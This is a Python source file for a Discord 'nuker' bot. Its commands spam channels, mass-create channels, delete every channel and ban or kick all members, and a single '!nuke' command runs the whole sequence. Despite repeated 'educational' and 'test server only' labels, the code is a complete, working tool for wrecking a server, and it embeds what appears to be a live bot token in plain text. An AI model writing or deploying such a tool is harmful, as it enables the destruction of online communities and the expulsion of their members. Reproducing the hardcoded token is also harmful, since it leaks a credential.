import discord
from discord.ext import commands
import asyncio
import logging

# ====================== CONFIG ======================
intents = discord.Intents.all()          # Required for members + channels
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

logging.basicConfig(level=logging.INFO)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")
    await bot.change_presence(activity=discord.Game("Educational Nuker - TEST SERVER ONLY"))

# ====================== SAFEGUARDS ======================
def is_owner(ctx):
    return ctx.author.id == YOUR_OWNER_ID  # ← CHANGE TO YOUR DISCORD ID

# ====================== FEATURE 1: SPAM MESSAGES ======================
@bot.command()
@commands.check(is_owner)
async def spam(ctx, amount: int = 50, *, message="Test spam - EDUCATIONAL ONLY"):
    """Spam messages in current channel (rate-limited)."""
    await ctx.message.delete()
    for i in range(amount):
        try:
            await ctx.send(f"{message} [{i+1}/{amount}]")
            await asyncio.sleep(0.7)  # Respect per-channel rate limit (\~5 msg/sec)
        except (discord.Forbidden, discord.HTTPException):
            break
    await ctx.send("✅ Spam complete (educational test).")

# ====================== FEATURE 2: CREATE CHANNELS CONTINUOUSLY ======================
@bot.command()
@commands.check(is_owner)
async def create_channels(ctx, amount: int = 30, *, name="nuke-test"):
    """Create many text channels."""
    await ctx.message.delete()
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(f"{name}-{i}")
            await asyncio.sleep(1.0)  # \~5 creates per 10 seconds guild limit
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(5)  # Back off on rate limit
            else:
                break
    await ctx.send("✅ Channel creation complete (test only).")

# ====================== FEATURE 3: DELETE ALL CHANNELS ======================
@bot.command()
@commands.check(is_owner)
async def delete_channels(ctx):
    """Delete every channel in the server."""
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):  # Copy list to avoid modification during iteration
        try:
            await channel.delete(reason="Educational nuke test")
            await asyncio.sleep(0.6)
        except (discord.Forbidden, discord.NotFound, discord.HTTPException):
            continue
    await ctx.send("✅ All channels deleted (test server only).")

# ====================== FEATURE 4: MASS KICK / BAN MEMBERS ======================
@bot.command()
@commands.check(is_owner)
async def nuke_members(ctx, action: str = "ban"):
    """Kick or ban all members (skips bot & owner)."""
    await ctx.message.delete()
    if action not in ("kick", "ban"):
        return await ctx.send("Use `!nuke_members ban` or `!nuke_members kick`")

    members = list(ctx.guild.members)
    for member in members:
        if member == ctx.guild.me or member.id == ctx.guild.owner_id or member.bot:
            continue
        try:
            if action == "ban":
                await ctx.guild.ban(member, reason="Educational nuke test", delete_message_seconds=0)
            else:
                await ctx.guild.kick(member, reason="Educational nuke test")
            await asyncio.sleep(1.2)  # Ban/kick rate limit safety
        except (discord.Forbidden, discord.HTTPException):
            continue

    await ctx.send(f"✅ Mass {action} complete (test environment only).")

# ====================== FULL NUKE COMMAND (ALL FEATURES) ======================
@bot.command()
@commands.check(is_owner)
async def nuke(ctx):
    """One-command educational nuke (use ONLY in test servers)."""
    await ctx.send("🚨 STARTING EDUCATIONAL NUKE TEST – THIS IS A SIMULATION ONLY 🚨")
    await asyncio.sleep(3)

    # 1. Spam a channel first
    await spam(ctx, 20, message="**EDUCATIONAL TEST** – Do not use maliciously!")

    # 2. Create channels
    await create_channels(ctx, 15)

    # 3. Delete everything
    await delete_channels(ctx)

    # 4. Ban members
    await nuke_members(ctx, "ban")

    await ctx.send("✅ Educational nuke sequence complete. Server is now reset for testing.")

# ====================== ERROR HANDLING & RATE LIMITS ======================
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        return
    if isinstance(error, discord.RateLimited):
        await asyncio.sleep(error.retry_after)
    else:
        print(f"Error: {error}")

# ====================== RUN THE BOT ======================
bot.run("MTQ4NTU4OTcxNzMxMDM3MzkxOA.G3y3tv.zkuPVid8whG83545hdQdFrh6i82EbvAnmkvqso")   # ← NEVER SHARE THIS
